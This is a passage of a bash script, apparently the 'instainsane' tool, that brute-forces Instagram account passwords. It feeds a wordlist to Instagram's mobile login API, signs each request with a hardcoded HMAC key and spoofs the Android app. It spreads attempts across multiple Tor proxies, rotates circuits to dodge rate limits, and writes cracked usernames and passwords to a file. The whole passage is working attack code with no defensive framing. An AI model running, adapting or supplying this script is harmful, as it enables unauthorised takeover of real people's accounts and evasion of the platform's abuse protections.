useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let counter9++

printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9059 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m";  rm -rf nottested.lst;kill -1 $$ > /dev/null 2>&1 ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  > /dev/null 2>&1 ; elif [[ $var == "Please wait" ]]; then echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid9=$! ;

let startline+=20
let endline+=20

done
}

bf10() {

while [ $counter10 -lt $turn ]; do
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
IFS=$'\n'
for pass in $(sed -n ''$((startline+sumstart))','$endline'p' $wl_pass); do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let counter10++

printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9060 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m";  rm -rf nottested.lst;kill -1 $$ > /dev/null 2>&1 ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  > /dev/null 2>&1 ; elif [[ $var == "Please wait" ]]; then echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; wait $pid1 > /dev/null 2>&1; wait $pid2 > /dev/null 2>&1 ; wait $pid3 > /dev/null 2>&1 ; wait $pid4 > /dev/null 2>&1; wait $pid5 > /dev/null 2>&1 ; wait $pid6 > /dev/null 2>&1;wait $pid7 > /dev/null 2>&1;
wait $pid8 > /dev/null 2>&1;
wait $pid9 > /dev/null 2>&1;
wait $! > /dev/null 2>&1;
let startline+=20
let endline+=20

done
}


# case "$1" in --resume) resume ;; *)

banner
checkroot
dependencies
start
multitor
killall -HUP tor
while [ $countpass -lt $count_pass ]; do

killall -HUP tor
##pkill -f -HUP "tor -f multitor/multitor1"; pkill -f -HUP "tor -f multitor/multitor2"; pkill -f -HUP "tor -f multitor/multitor3";pkill -f -HUP "tor -f multitor/multitor4";pkill -f -HUP "tor -f multitor/multitor5"

bf1 
let turn+=20
bf2 
let turn+=20
bf3 
let turn+=20
bf4 
let turn+=20
bf5 
let turn+=20
bf6
let turn+=20
bf7
let turn+=20
bf8
let turn+=20
bf9
let turn+=20
bf10 
let turn-=160
killall -HUP tor
###
#pkill -f -HUP "tor -f multitor/multitor1"; pkill -f -HUP "tor -f multitor/multitor2"; pkill -f -HUP "tor -f multitor/multitor3"; pkill -f -HUP "tor -f multitor/multitor4"; pkill -f -HUP "tor -f multitor/multitor5"
done
exit 1
esac
